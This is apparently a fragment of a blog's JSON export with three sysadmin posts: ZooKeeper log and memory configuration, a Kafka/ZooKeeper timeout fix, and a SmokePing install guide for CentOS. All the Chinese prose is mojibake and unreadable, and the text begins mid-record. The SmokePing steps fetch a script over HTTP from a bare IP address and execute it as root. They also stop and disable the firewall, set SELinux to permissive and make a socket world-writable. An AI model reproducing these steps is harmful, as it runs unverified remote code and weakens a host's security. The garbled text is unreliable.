CONSOLEzookeeper.console.threshold=INFOzookeeper.log.dir=.zookeeper.log.file=zookeeper.logzookeeper.log.threshold=DEBUGzookeeper.tracelog.dir=.zookeeper.tracelog.file=zookeeper_trace.log zkæ—¥å¿—.outåŠlog4jæ—¥å¿—è·¯å¾„é…ç½® ï¼šé¦–å…ˆä¿®æ”¹bin/zkEnv.shï¼Œé…ç½®ZOO_LOG_DIRçš„ç¯å¢ƒå˜é‡ï¼ŒZOO_LOG_DIRæ˜¯zookeeperæ—¥å¿—è¾“å‡ºç›®å½•ï¼ŒZOO_LOG4J_PROPæ˜¯log4jæ—¥å¿—è¾“å‡ºçš„é…ç½®ï¼š é»˜è®¤é…ç½®ï¼š 123456789if [ \"x$&#123;ZOO_LOG_DIR&#125;\" = \"x\" ]then ZOO_LOG_DIR=\".\"fiif [ \"x$&#123;ZOO_LOG4J_PROP&#125;\" = \"x\" ]then ZOO_LOG4J_PROP=\"INFO,CONSOLE\"fi ç”Ÿäº§ç¯å¢ƒä¿®æ”¹ï¼š åœ¨zkç›®å½•ä¸‹é¢åˆ›å»ºlogsç›®å½• ç»™äºˆbiç»„æ“ä½œæƒé™ã€‚ 12sudo mkdir /data/tools/zookeeper-3.4.5/logs/sudo chown -R jollybi:jollybi /data/tools/zookeeper-3.4.5/logs/ 123456789if [ \"x$&#123;ZOO_LOG_DIR&#125;\" = \"x\" ]then ZOO_LOG_DIR=\"$ZOOBINDIR/../logs\"fiif [ \"x$&#123;ZOO_LOG4J_PROP&#125;\" = \"x\" ]then ZOO_LOG4J_PROP=\"INFO,ROLLINGFILE\" //ROLLINGFILE â€”â€” æ—¥å¿—è½®è½¬ï¼Œé¿å…å•ä¸€æ–‡ä»¶è¿‡å¤§fi Zkè®¾ç½®å®šæœŸè‡ªåŠ¨æ¸…ç†æ—¥å¿—.ä»3.4.0å¼€å§‹ï¼Œzookeeperæä¾›äº†è‡ªåŠ¨æ¸…ç†snapshotå’Œäº‹åŠ¡æ—¥å¿—çš„åŠŸèƒ½ï¼Œé€šè¿‡é…ç½® autopurge.snapRetainCount å’Œ autopurge.purgeInterval è¿™ä¸¤ä¸ªå‚æ•°èƒ½å¤Ÿå®ç°å®šæ—¶æ¸…ç†äº†ã€‚è¿™ä¸¤ä¸ªå‚æ•°éƒ½æ˜¯åœ¨zoo.cfgä¸­é…ç½®çš„ï¼š åœ¨zoo.cfgä¸­é…ç½®ï¼š 12345autopurge.purgeInterval: 24*2 ##è¿™ä¸ªå‚æ•°æŒ‡å®šäº†æ¸…ç†é¢‘ç‡ï¼Œå•ä½æ˜¯å°æ—¶ã€‚é»˜è®¤æ˜¯0ï¼Œè¡¨ç¤ºä¸å¼€å¯è‡ªå·±æ¸…ç†åŠŸèƒ½ã€‚autopurge.snapRetainCount: 2##è¿™ä¸ªå‚æ•°å’Œä¸Šé¢çš„å‚æ•°æ­é…ä½¿ç”¨ï¼Œè¿™ä¸ªå‚æ•°æŒ‡å®šäº†éœ€è¦ä¿ç•™çš„æ–‡ä»¶æ•°ç›®ã€‚é»˜è®¤æ˜¯ä¿ç•™3ä¸ªã€‚ é…ç½®zookeeper.outçš„ä½ç½®åŠlog4jæ—¥å¿—è¾“å‡º1. zookeeper.outç”±nohupçš„è¾“å‡ºï¼Œä¹Ÿå°±æ˜¯zookeeperçš„stdoutå’Œstdeerè¾“å‡ºã€‚åœ¨zkServer.shä¸­ï¼š 123456789if [ ! -w \"$ZOO_LOG_DIR\" ] ; then mkdir -p \"$ZOO_LOG_DIR\" fi _ZOO_DAEMON_OUT=\"$ZOO_LOG_DIR/zookeeper.out\" #æ—¥å¿—è¾“å‡ºæ–‡ä»¶è·¯å¾„#nohupæ—¥å¿—è¾“å‡ºnohup $JAVA \"-Dzookeeper.log.dir=$&#123;ZOO_LOG_DIR&#125;\" \"-Dzookeeper.root.logger=$&#123;ZOO_LOG4J_PROP&#125;\" \\ -cp \"$CLASSPATH\" $JVMFLAGS $ZOOMAIN \"$ZOOCFG\" &gt; \"$_ZOO_DAEMON_OUT\" 2&gt;&amp;1 &lt; /dev/null &amp; 2.log4jæ—¥å¿—è¾“å‡ºé…ç½® conf/log4j.propertiesä¸­ï¼š123456# Add ROLLINGFILE to rootLogger to get log file output # Log DEBUG level and above messages to a log file log4j.appender.ROLLINGFILE=org.apache.log4j.RollingFileAppender //æ—¥å¿—è½®è½¬ï¼ŒDaliyRollingFileAppender â€”â€” æŒ‰å¤©è½®è½¬log4j.appender.ROLLINGFILE.Threshold=$&#123;zookeeper.log.threshold&#125; log4j.appender.ROLLINGFILE.File=$&#123;zookeeper.log.dir&#125;/$&#123;zookeeper.log.file&#125; è½®è½¬å‰æéœ€è¦å°†(1)é‡Œbin/zkEnv.shä¸­çš„è½®è½¬é…ç½®å¥½ 4.zkäº‹åŠ¡æ—¥å¿—æŸ¥çœ‹ zookeeperçš„äº‹åŠ¡æ—¥å¿—é€šè¿‡zoo.cfgæ–‡ä»¶ä¸­çš„dataLogDiré…ç½®é¡¹é…ç½®ï¼š # the directory where the snapshot is stored. # do not use /tmp for storage, /tmp here is just # example sakes. dataDir=/tmp/zookeeper æŸ¥çœ‹äº‹åŠ¡æ—¥å¿—æ–¹æ³•ï¼š(éœ€è¦ä¸‹è½½slf4j-api-1.6.1.jaråŒ…) 1java -classpath .:slf4j-api-1.6.1.jar:zookeeper-3.4.5.jar org.apache.zookeeper.server.LogFormatter /tmp/zookeeper/version-2/xxx.xxx æ€ä¹ˆè‡ªå®šä¹‰zookeeperçš„å¯åŠ¨å†…å­˜è¿è¡Œzookeeperæ—¶ï¼Œä½¿ç”¨jmap -heap å‘½ä»¤æŸ¥çœ‹å†…å­˜æƒ…å†µå¦‚ä¸‹: è§£å†³ï¼šåˆ†é…å†…å­˜æ–‡ä»¶è·¯å¾„ï¼šzookeeper/bin/zkEnv.sh è¯¥æ–‡ä»¶å·²ç»æ˜ç¡®è¯´æ˜æœ‰ç‹¬ç«‹JVMå†…å­˜çš„è®¾ç½®æ–‡ä»¶ï¼Œè·¯å¾„æ˜¯zookeeper/conf/java.envå®‰è£…çš„æ—¶å€™è¿™ä¸ªè·¯å¾„ä¸‹æ²¡æœ‰æœ‰java.envæ–‡ä»¶ï¼Œéœ€è¦è‡ªå·±æ–°å»ºä¸€ä¸ªï¼š 12345678# vim java.env#!/bin/shexport JAVA_HOME=/usr/java/jdk# heap size MUST be modified according to cluster environmentexport JVMFLAGS=\"-Xms4g -Xmx4g $JVMFLAGS\"å¯¹äºå†…å­˜çš„åˆ†é…ï¼Œè¿˜æ˜¯æ ¹æ®é¡¹ç›®å’Œæœºå™¨æƒ…å†µè€Œå®šã€‚å¦‚æœå†…å­˜å¤Ÿç”¨ï¼Œé€‚å½“çš„å¤§ç‚¹å¯ä»¥æå‡zkæ€§èƒ½ã€‚","link":"/2017/08/27/Bigdata-hadoop/zookeeper/Bigdata-Zookeeperé›†ç¾¤æ—¥å¿—é…ç½®è¯¦è§£å’Œæ¸…ç†è‡ªå®šä¹‰å¯åŠ¨å†…å­˜ /"},{"title":"Zookeeper æŠ¥é”™ï¼šUnable to connect to zookeeper server within timeout:6000","text":"Zookeeper æŠ¥é”™ï¼šUnable to connect to zookeeper server within timeout : 6000é—®é¢˜ï¼šException in thread â€œmainâ€ org.I0Itec.zkclient.exception.ZkTimeoutException: Unable to connect to zookeeper server within timeout: 6000 è§£å†³ï¼šI had the same problem and here is how I fixed it:1) Stop all Kafka and Zookeeper processes 12ps -aux | grep zoops -aux | grep kafka (then proceed to kill all process ids from above jobs)2) Run zookeeper 1&lt;kafka_dir&gt;/bin/zookeeper-server-start.sh ../config/zookeeper.properties 3) Run kafka server 1&lt;kafka_dir&gt;/bin/kafka-server-start.sh ../config/server.properties âœ¨âœ¨æŸ¥çœ‹zké…ç½®ç„¶åé‡å¯æœåŠ¡ã€‚ 123./zookeeper-3.4.6/bin/zkServer.sh start./zookeeper-3.4.6/bin/zkServer.sh status./bin/kafka-server-start.sh config/server.properties &amp; å…ˆé‡å¯zkåé‡å¯kafka å› ä¸ºkafkaåŸºäºzkè¿è¡Œçš„,Zkè¿è¡Œè¶…æ—¶ã€‚è¯´æ˜è¿æ¥æœ‰é—®é¢˜ã€‚æŸ¥çœ‹å¯åŠ¨æ—¥å¿—ã€‚","link":"/2017/05/04/Bigdata-hadoop/zookeeper/Zookeeper æŠ¥é”™ï¼šUnable to connect to zookeeper server within timeout: 6000/"},{"title":"ç”¨æœ€ç®€å•çš„æ–¹å¼å®‰è£…smokeping","text":"smokepingè¿™ä¸ªç›‘æ§è¿˜æ˜¯å¾ˆå¼ºå¤§çš„ï¼Œç”¨è¿™ä¸ªç›‘æ§æ˜¯åœ¨ç¬¬ä¸€å®¶å…¬å¸åšIDCèµ·å®¶åé¢è½¬å‹CDNäº‘è®¡ç®—äº‘åŠ é€Ÿã€‚è¿™ä¸ªä¹Ÿæ˜¯æˆ‘å­¦çš„æœ€æ—©çš„ä¸€æ¬¾ç›‘æ§ï¼Œåœ¨è¿™é‡Œæˆ‘ç”¨ç¼–è¯‘å®‰è£…æ–¹å¼ã€‚ä¹Ÿæœ‰è„šæœ¬å®‰è£…ä¸è¿‡éœ€è¦äº†è§£è¿‡somkepingå®‰è£…è¿‡ç¨‹ä¼šæ¯”è¾ƒçœ‹çš„æ‡‚è„šæœ¬ã€‚ é€‚ç”¨äºå®½å¸¦è¿è¥å•†ç»´æŠ¤å’ŒIDCæœºæˆ¿ç»´æŠ¤å¯ä»¥æ£€æµ‹æœ¬åœ°ç½‘ç»œçš„åˆ°ä¸Šçº§è¿è¥å•†å‡ºå£è¿™æ®µè·¯ç”±å„ä¸ªèŠ‚ç‚¹çš„ç¨³å®šæ€§ å¯ä»¥æ£€æµ‹æœ¬åœ°ç½‘ç»œåˆ°å„ä¸»è¦é—¨æˆ·ç½‘ç«™çš„å»¶æ—¶ï¼Œä¸¢åŒ…ç‡ï¼Œç¨³å®šæ€§å¯ä»¥æ£€æµ‹æœ¬åœ°ç½‘ç»œåˆ°å„åœ°æ¸¸æˆæœåŠ¡å™¨çš„å»¶æ—¶ï¼Œä¸¢åŒ…ç‡ï¼Œç¨³å®šæ€§ smokepingç¼ºç‚¹ï¼šä¸èƒ½åœ¨å‰å°Webé¡µé¢æ·»åŠ è¦æ£€æµ‹çš„èŠ‚ç‚¹ï¼Œå¿…é¡»åœ¨åå°smokepingçš„é…ç½®æ–‡ä»¶ä¸­æ·»åŠ  å®‰è£…å‰çš„å‡†å¤‡ï¼š æ“ä½œç³»ç»Ÿï¼šé€‰æ‹©centOS6.5æœ€å°åŒ–ç‰ˆï¼Œ é‡Œé¢çš„RPMåŒ…åŸºæœ¬ä¸Šéƒ½æ˜¯æœ€æ–°çš„ã€‚ æ³¨1: centOS 5.6ç‰ˆæœ¬åœ¨å®‰è£…rpmforge-release-0.5.3-1.el6.rf.x86_64.rpmåŒ…æ˜¯ä¼šé‡åˆ°ä¾èµ–æ€§é—®é¢˜ï¼Œè¦æ±‚å®‰è£…rpmlibåŒ…ï¼Œä½†centOS5.6ç‰ˆæœ¬ä¸­çš„rpmlibç‰ˆæœ¬è¾ƒä½ï¼Œæ— æ³•ç›´æ¥å®‰è£… æ³¨2ï¼šåœ¨å®‰è£…centOS6.5æ—¶ï¼Œè¦æ³¨æ„è®¾ç½®ç³»ç»Ÿçš„IPåœ°å€ï¼Œå¦‚ä¸‹å›¾,ç‚¹å‡»ã€configure networkã€‘æŒ‰é’®ï¼Œé€‰æ‹©ã€system eth0ã€‘, ç‚¹å‡» ã€IPv4Setingã€‘,è®¾ç½®IPåœ°å€ æ³¨3: é€‰æ‹©å®‰è£…åŒ…æ—¶ï¼Œç‚¹é€‰ã€Basic Serverã€‘, è¦å®‰è£…621ä¸ªåŸºæœ¬åŒ… æ³¨4: å…¶ä»–å®‰è£…æ­¥éª¤ï¼ŒæŒ‰ç…§æ­£å¸¸çš„å®‰è£…æµç¨‹æ“ä½œå³å¯ äºŒ. å®‰è£…è¿‡ç¨‹ä¿®æ”¹æ—¶åŒº 1\\cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime åŒæ­¥æ—¶é—´ 1ntpdate time.nist.gov å†™å…¥BIOS 1hwclock -w å…³é—­é˜²ç«å¢™ 1service iptables stop 1. å®‰è£…ç¬¬ä¸‰æ–¹è½¯ä»¶æº123464ä½ç³»ç»Ÿ rpm -Uvh http://apt.sw.be/redhat/el6/en/x86_64/rpmforge/RPMS/rpmforge-release-0.5.3-1.el6.rf.x86_64.rpm32ä½ç³»ç»Ÿrpm -Uvh http://apt.sw.be/redhat/el6/en/i386/rpmforge/RPMS/rpmforge-release-0.5.3-1.el6.rf.i686.rpm æ³¨ï¼šå®‰è£…è¿™ä¸ªæºåï¼Œæ¥ä¸‹æ¥è¦å®‰è£…çš„å¤§é‡çš„ä¾èµ–åŒ…å°±ä¸ä¼šæŠ¥é”™ 123rpm -Uvh http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm sed -i 's/^#baseurl/baseurl/g' /etc/yum.repos.d/epel.reposed -i 's/mirrorlist/#mirrorlist/g' /etc/yum.repos.d/epel.repo 2. å®‰è£…rrdtoolä¸ä¾èµ–åº“1yum -y install perl perl-Net-Telnet perl-Net-DNS perl-LDAP perl-libwww-perl perl-RadiusPerl perl-IO-Socket-SSL perl-Socket6 perl-CGI-SpeedyCGI perl-FCGI perl-CGI-SpeedCGI perl-Time-HiRes perl-ExtUtils-MakeMaker perl-RRD-Simple rrdtool rrdtool-perl curl fping echoping httpd httpd-devel gcc make wget libxml2-devel libpng-devel glib pango pango-devel freetype freetype-devel fontconfig cairo cairo-devel libart_lgpl libart_lgpl-devel mod_fastcgi screen wqy-zenhei-fonts.noarch wqy-zenhei-fonts-common.noarch lrzsz nginx æ³¨ï¼šperl-CGI-SpeedyCGIï¼Œperl-CGI-SpeedCGIè¿™ä¸¤ä¸ªåŒ…åœ¨å®‰è£…è¿‡ç¨‹ä¸­ä¼šæç¤ºæ‰¾ä¸åˆ°ï¼Œä½†æ²¡å…³ç³»æ³¨ï¼šç”¨yumå®‰è£…å¤§é‡çš„ä¾èµ–åŒ…è¿˜æ˜¯å¾ˆæ–¹ä¾¿çš„ï¼Œè€Œç™¾åº¦ä¸Šæœ‰äº›å…³äºå®‰è£…smokepingçš„æ–‡æ¡£è¦æ±‚ä½¿ç”¨wgetä¸‹è½½åå†ç”¨make,make installæ–¹å¼å®‰è£…ï¼Œè™½ç„¶makeæ–¹å¼ä¸å¤æ‚ï¼Œä½†é€šè¿‡makeç¼–è¯‘å†å®‰è£…å‡ åä¸ªåŒ…å°±æ˜¾å¾—æœ‰ç‚¹ç¹é”äº†ã€‚ 3.ä¸‹è½½ä¸å®‰è£…smokeping12345wget http://oss.oetiker.ch/smokeping/pub/smokeping-2.6.8.tar.gzwget http://oss.oetiker.ch/smokeping/pub/smokeping-2.6.11.tar.gz tar zxvf smokeping-2.6.8.tar.gzcd smokeping-2.6.8./configure --prefix=/usr/local/smokeping å‡ºç°é—®é¢˜æ˜¯å› ä¸ºéœ€è¦å®‰è£…perlçš„æ¨¡å—ï¼Œæ‰€ä»¥è¿è¡Œä¸‹é¢å†…å®¹å³å¯ 1234567å¦‚æœåªå‡ºç° Config::Grammar' ... Failedè§£å†³ 'Config::Grammar' ... Failedwget http://search.cpan.org/CPAN/authors/id/D/DS/DSCHWEI/Config-Grammar-1.10.tar.gztar zxvf Config-Grammar-1.10.tar.gzcd Config-Grammar-1.10perl Makefile.PLmake &amp;&amp; make install å¦‚æœå‡ºç°å¾ˆå¤šä¸ªfailedï¼Œå°±ç”¨ä¸‹é¢çš„æ–¹æ³• 1234567./setup/build-perl-modules.sh /usr/local/smokeping/thirdparty è¿™ä¸ªæ˜¯ä¸ºå‰é¢failedåšå®‰è£… ./co nfigure --prefix=/usr/local/smokeping å¦‚æœè¿˜å‡ºç°é—®é¢˜å¯ä»¥çœ‹ä¸‹è¿™é‡Œé¢çš„å‚è€ƒã€‚http://bbs.51cto.com/thread-1106181-1.html/usr/bin/gmake installå®‰è£…ä¸‹yum install cpan perl -MCPAN -e 'install CGI' perl -MCPAN -e 'install CGI::Fast ' è¿™ä¸ªå®‰è£…å¥½äº†ç„¶åå†æ‰§è¡Œè¿™ä¸€æ­¥ã€‚ å¦‚æœä¸Šé¢æç¤ºCGI æ²¡æœ‰å®‰è£…æˆåŠŸã€‚ 1234567wgethttp://www.cpan.org/authors/id/M/MA/MARKSTOS/CGI.pm-3.65.tar.gztar zxvf CGI.pm-3.65.tar.gzcd CGI.pm-3.65perl Makefile.PLmake &amp;&amp; make installç„¶åå†æ‰§è¡Œä¸‹ ./configure --prefix=/usr/local/smokeping ç°åœ¨smokepingå®‰è£…å®Œæˆ 4. é…ç½®smokepingç¬¬ä¸€ç§ ä½¿ç”¨nginx12341.å®‰è£…nginxrpm -Uvh http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpmyum install -y nginxhttps://metacpan.org/pod/release/MSTROUT/ExtUtils-MakeMaker-6.59/lib/ExtUtils/MakeMaker.pm ä¸‹è½½Make è®©ä»–ç›´æ¥æ‰§è¡Œ 2.å®‰è£…åŸºç¡€IO 123456cd /rootwget http://220.194.199.196/download/IO-All-0.46.tar.gztar xvzf IO-All-0.46.tar.gzcd IO-All-0.46perl Makefile.PL # è¿™é‡Œå‡ºç°è¿™ä¸ªé—®é¢˜ æŠŠé‚£ä¸ªæ–‡ä»¶åˆ äº†å°±è¡Œäº†ã€‚make &amp;&amp; make install 3.é…ç½®nginxçš„sockåˆ›å»ºfcgi sock æ–‡ä»¶ï¼Œé…ç½®nginx fcgiä½¿ç”¨ 12345#wget http://autonagios.googlecode.com/svn/trunk/autonagios-20100103/files/nginx-fcgi.txt -O /etc/nginx-fcgiwget http://117.27.153.133/nginx-fcgi.txt -O /etc/nginx-fcgi chmod a+x /etc/nginx-fcgi/etc/nginx-fcgi -l /var/log/nginx-fcgi.log -pid /var/run/nginx-fcgi.pid -S /var/run/nginx-fcgi.sockchmod 777 /var/run/nginx-fcgi.sock 4.å¢åŠ smokepingä½¿ç”¨çš„dataã€varã€å’Œcacheç›®å½• 123456cd /usr/local/smokepingmkdir data var cachemv htdocs/smokeping.fcgi.dist htdocs/smokeping.fcgicd /usr/local/smokeping/etcmv config.dist configchmod 600 /usr/local/smokeping/etc/smokeping_secrets.dist 5.ä¸Šä¼ ç›‘æ§èŠ‚ç‚¹confæ–‡ä»¶åˆ°smokepingçš„etcç›®å½•6.ä¿®æ”¹smokpeingé…ç½®è„šæœ¬ 123456789101112131415vi configåœ¨å¦‚ä¸‹ä½ç½®ä¿®æ”¹*** Database ***step = 300pings = 20ä¿®æ”¹ä¸º*** Database ***step = 60pings = 20åœ¨å¦‚ä¸‹ä½ç½®æ·»åŠ ä¸€å¥è¯*** Presentation ***template = /usr/local/smokeping/etc/basepage.html.distcharset=utf-8 åœ¨ç¬¬ä¸€ä¸ªåŠ å·ä½ç½®ä¸‹å°†ç›‘æ§èŠ‚ç‚¹æ–‡ä»¶å¼•å…¥ï¼Œå¦‚ä¸‹ä¾‹å­ 1234567+ testnetworkmenu=æµ‹è¯•ç½‘ç»œçŠ¶å†µtitle= æµ‹è¯•ç½‘ç»œçŠ¶å†µ@include CT-IP.conf@include CN-IP.conf@include CT_IDC.conf@include CNC-IDC.conf ä¿å­˜é€€å‡º 7.å¢åŠ dataã€varã€cacheç›®å½•çš„è½¯è¿æ¥ 123ln -s /usr/local/smokeping/data/ /usr/share/nginx/html/dataln -s /usr/local/smokeping/cache/ /usr/share/nginx/html/cacheln -s /usr/local/smokeping/htdocs/cropper/ /usr/share/nginx/html/cropper 8.ä¿®æ”¹nginx é…ç½®æ–‡ä»¶æŸ¥çœ‹ä¸‹nginxçš„ç‰ˆæœ¬ï¼Œä½¿ç”¨nginx -v æŸ¥çœ‹ï¼Œå¦‚ä¸‹ä¾‹å­ï¼š 12 nginx -vnginx version: nginx/1.0.15 ä¿®æ”¹nginxé…ç½® 1234567891011vi /etc/nginx/conf.d/default.conf--å¢åŠ fcgi æŒ‡å‘ location ~ .*\\.fcgi$ &#123; root /usr/local/smokeping/htdocs/; gzip off; fastcgi_pass unix:/var/run/nginx-fcgi.sock; fastcgi_index smokeping.fcgi; include fastcgi.conf; #1.0.x ä¸0.8.x ç”¨è¿™ä¸ª #include fastcgi_params; #1.4.xç‰ˆæœ¬ç”¨ fastcgi_params #fastcgi_param SCRIPT_FILENAME /opt/smokeping/htdocs$fastcgi_script_name; #1.4.xç‰ˆæœ¬å¿…åŠ  &#125; ä¿å­˜é€€å‡º ç¬¬äºŒç§ ä½¿ç”¨apache(1) åˆ›å»ºcacheã€dataã€varç›®å½• 12cd /usr/local/smokepingmkdir htdocs/cache data var (2) åœ¨åˆ›å»ºæ—¥å¿— 1touch /var/log/smokeping.log (3) ä¸Šä¼ ç›‘æ§èŠ‚ç‚¹çš„confæ–‡ä»¶åˆ°smokepingçš„etcç›®å½•ä¸‹ä¿®æ”¹smokepingç›®å½•çš„ç”¨æˆ·å’Œç»„æƒé™ 12chown apache:apache -R /usr/local/smokepingchown apache:apache /var/log/smokeping.log (4) ä¿®æ”¹é…ç½®æ–‡ä»¶ 12345678910111213141516171819202122232425262728cd /usr/local/smokeping/htdocs/mv smokeping.fcgi.dist smokeping.fcgicd /usr/local/smokeping/etcmv config.dist configvi configä¿®æ”¹æ”¹è¡Œè®¾ç½®imgcache = /usr/local/smokeping/cacheimgcache = /usr/local/smokeping/htdocs/cache *** Database ***step = 300pings = 60ç„¶åä¿®æ”¹stepï¼Œä»300æ”¹ä¸º60ï¼Œè¿™æ˜¯æ£€æµ‹çš„æ—¶é—´, pings ä»20 æ”¹ä¸º60, å³60ç§’ping 60æ¬¡åœ¨å¦‚ä¸‹ä½ç½®æ·»åŠ ä¸€å¥è¯*** Presentation ***template = /usr/local/smokeping/etc/basepage.html.distcharset=utf-8åœ¨ç¬¬ä¸€ä¸ªåŠ å·ä½ç½®ä¸‹å°†ç›‘æ§èŠ‚ç‚¹æ–‡ä»¶å¼•å…¥ï¼Œå¦‚ä¸‹ä¾‹å­+ testnetworkmenu=æµ‹è¯•ç½‘ç»œçŠ¶å†µtitle= æµ‹è¯•ç½‘ç»œçŠ¶å†µ@include CT-IP.conf@include CN-IP.conf@include CT_IDC.conf@include CNC-IDC.conf ä¿å­˜é€€å‡º (5) é…ç½®å®Œæˆä¹‹åä¿®æ”¹å¯†ç æ–‡ä»¶æƒé™ 1chmod 600 /usr/local/smokeping/etc/smokeping_secrets.dist ä¿®æ”¹apacheçš„é…ç½® 12345678910111213141516vim /etc/httpd/conf/httpd.confåœ¨DocumentRoot \"/var/www/html\" è¿™ä¸€è¡Œä¹‹ä¸‹æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼šAlias /cache \"/usr/local/smokeping/htdocs/cache\"Alias /cropper \"/usr/local/smokeping/htdocs/cropper\"Alias /smokeping \"/usr/local/smokeping/htdocs\"&lt;Directory \"/usr/local/smokeping/htdocs\"&gt; AllowOverride None AddHandler cgi-script .fcgi .cgi Options ExecCGI &lt;IfModule dir_module&gt; DirectoryIndex smokeping.fcgi &lt;/IfModule&gt; Order allow,deny Allow from all &lt;/Directory&gt; è®¾ç½®å¼€æœºå¯åŠ¨httpd, smokeping,å¹¶å…³é—­iptables. 1234echo \"/usr/local/smokeping/bin/smokeping --logfile=/var/log/smokeping.log 2&gt;&amp;1 &amp;\" &gt;&gt; /etc/rc.localchkconfig httpd on #å¼€æœºå¯åŠ¨httpdè¿›ç¨‹chkconfig iptables off #å¼€æœºä¸å¯åŠ¨iptablesæœåŠ¡chkconfig nginx on å¯åŠ¨httpæˆ–è€…nginxä»¥åŠsmokeping 123service httpd start service nginx start/usr/local/smokeping/bin/smokeping --debug-daemonchown apache:apache -R /usr/local/smokeping æ‰“å¼€æ£€æµ‹ä¸»æœºçš„Webé¡µé¢. ä½¿ç”¨httpdåšwebï¼Œåœ¨Webæµè§ˆå™¨é‡Œè¾“å…¥http://æ‚¨çš„ç›‘æ§ä¸»æœºIP/smokeping è¿™é‡Œå¯åŠ¨ä¸äº†ï¼Œçœ‹ä¸‹ä»€ä¹ˆåŸå› ã€‚æ˜¯ä¸æ˜¯CT-IDC.conf æ²¡æœ‰ä¸Šä¼ åˆ°etcä¸‹é¢ æ‰“å¼€è¿™é‡Œå‡ºç°500 è¯´æ˜é…ç½®æ­£ç¡®é˜²ç«å¢™çœ‹ä¸‹ã€‚serenfroce 0 æœ‰æ²¡æœ‰å…³é—­ã€‚ ä½¿ç”¨nginxåšwebï¼Œåœ¨Webæµè§ˆå™¨é‡Œè¾“å…¥ http://æ‚¨çš„ç›‘æ§ä¸»æœºIP/smokeping.fcgi è¿™é‡Œå¯åŠ¨ä¸äº†ï¼Œçœ‹ä¸‹ä»€ä¹ˆåŸå› ã€‚æ˜¯ä¸æ˜¯CT-IDC.conf æ²¡æœ‰ä¸Šä¼ åˆ°etcä¸‹é¢ å¦‚æœé‡åˆ°500é”™è¯¯ï¼š 123456789101112Internal Server ErrorThe server encountered an internal error or misconfiguration and was unable to complete your request.Please contact the server administrator, root@localhost and inform them of the time the error occurred, and anything you might have done that may have caused the error.More information about this error may be available in the server error log.--------------------------------------------------------------------------------Apache/2.2.15 (CentOS) Server at 192.168.2.101 Port 80è¯´æ˜æ²¡æœ‰å…³é—­SElinux é€‰é¡¹ï¼Œå…³é—­å°±æ­£å¸¸äº†vi /etc/sysconfig/selinuxSELINUX=permissive[root@localhost ~]# getenforce #æŸ¥çœ‹SElinux çš„å‘½ä»¤Permissive #è¿”å›çš„ç»“æœæ˜¯Permissive, è¡¨ç¤ºå·²ç»å…³é—­SElinuxäº† åœ¨Webé¡µé¢å¢åŠ éªŒè¯ç”¨æˆ·åå’Œå¯†ç (å¯é€‰æ­¥éª¤) 1234567891011121314(1)ä¿®æ”¹httpd.confé‡Œçš„å†…å®¹&lt;Directory \"/usr/local/smokeping\"&gt;AllowOverride NoneOptions AllAddHandler cgi-script .fcgi .cgiAllowOverride AuthConfigOrder allow,denyAllow from allAuthName \"Smokeping\"AuthType BasicAuthUserFile /usr/local/smokeping/htdocs/htpasswdRequire valid-userDirectoryIndex smokeping.fcgi&lt;/Directory&gt; æ³¨ï¼šä¸Šé¢çš„å†…å®¹éƒ¨åˆ†å·²ç»æ·»åŠ ï¼Œè¿™é‡Œä»…æ·»åŠ çº¢è‰²å­—ä½“å†…å®¹å³å¯ã€‚ (2) è®¾ç½®ç™»å½•è´¦æˆ·ä¸å¯†ç è¿›å…¥cd /usr/local/smokeping/htdocsç›®å½•ï¼Œ æ‰§è¡Œå‘½ä»¤ï¼šhtpasswd -c /usr/local/smokeping/htdocs/htpasswd adminè¿™ä¸ªæ˜¯è®¾ç½®ç™»å½•è´¦æˆ·ä¸ºadminï¼Œå¯†ç åœ¨åé¢è¾“å…¥ï¼Œç„¶åé‡å¯httpdå°±å¯ä»¥å®ç°å¯†ç éªŒè¯ç™»å½•é‡æ–°ç™»å½•webé¡µé¢ï¼Œä¼šè¦æ±‚è¾“å…¥ç”¨æˆ·åå’Œå¯†ç . ä¸€å®šè¦åŒæ­¥å¥½æ—¶é—´ åœ¨ESXI4çš„è™šæ‹Ÿæœºä¸­ï¼Œå®šæœŸæ‰§è¡Œntpdate 210.72.145.44 #æˆ–è€…ä¸æœ¬åœ°çš„æ—¶é—´æœåŠ¡å™¨åŒæ­¥åœ¨vmware workstationä¸­ï¼Œå®‰è£…vmware-toolsï¼Œ è™šæ‹Ÿæœºçš„æ—¶é—´ä¼šè‡ªåŠ¨ä¸å…¶å®¿ä¸»æœºæ—¶é—´åŒæ­¥ æ³¨ï¼š å¦‚æœvmware workstationä¸­çš„è™šæ‹Ÿæœºä¸å®‰è£…vmware-toolsï¼Œåˆ™è™šæ‹Ÿæœºæ—¶é—´ä¼šä¸å®¿ä¸»æœºæ—¶é—´ç›¸éš”æ•´æ•´8ä¸ªå°æ—¶(è™šæ‹Ÿæœºæ—¶é—´æ—©äºå®¿ä¸»æœºæ—¶é—´) vmware-toolsçš„å®‰è£…ä¸åœ¨æ­¤å™è¿° ç‰¹åˆ«è¯´æ˜: ä¿®æ”¹/usr/local/smokeping/etc/config æ–‡ä»¶çš„é…ç½®å‚æ•°ï¼Œå¿…é¡»é‡å¯åŠ¨smokepingç¨‹åº 12345(1)å¦‚æœé‡å¯åŠ¨smokepingç¨‹åºå¤±è´¥ï¼Œæ ¹æ®æŠ¥é”™æç¤ºåˆ é™¤/usr/local/smokeping/dataå­æ–‡ä»¶å¤¹çš„rrdæ–‡ä»¶(2)ä¸­æ–‡é—®é¢˜ï¼šå¦‚æœéœ€è¦åœ¨ç½‘é¡µé‡Œå±•ç¤ºä¸­æ–‡ï¼Œä¿®æ”¹/usr/local/smokeping/etcçš„configæ–‡ä»¶*** Presentation ***charset = utf-8 //æ³¨ï¼šåœ¨è¿™é‡Œæ·»åŠ ç„¶ååœ¨menuä¸titileé‡Œä¿®æ”¹ä¸­æ–‡ï¼Œé‡å¯å³å¯ æœ‰ä¸€ä¸ªè¦æ³¨æ„çš„åœ°æ–¹å°±æ˜¯ï¼Œä½ è¾“å…¥çš„ä¸­æ–‡å¿…é¡»åœ¨utf-8çš„å­—ç¬¦ç¼–ç ä¸‹è¾“å…¥çš„ä¸­æ–‡å­—ç¬¦ï¼Œä¸ç„¶ä¼šå‡ºç°ä¹±ç ã€‚ å¦‚æœåœ¨xshelä¸‹ï¼Œé€‰æ‹©file-properities-terminalå¦‚æœè¿˜æ˜¯ä¸æ˜¾ç¤ºå°±çœ‹çœ‹ä½ 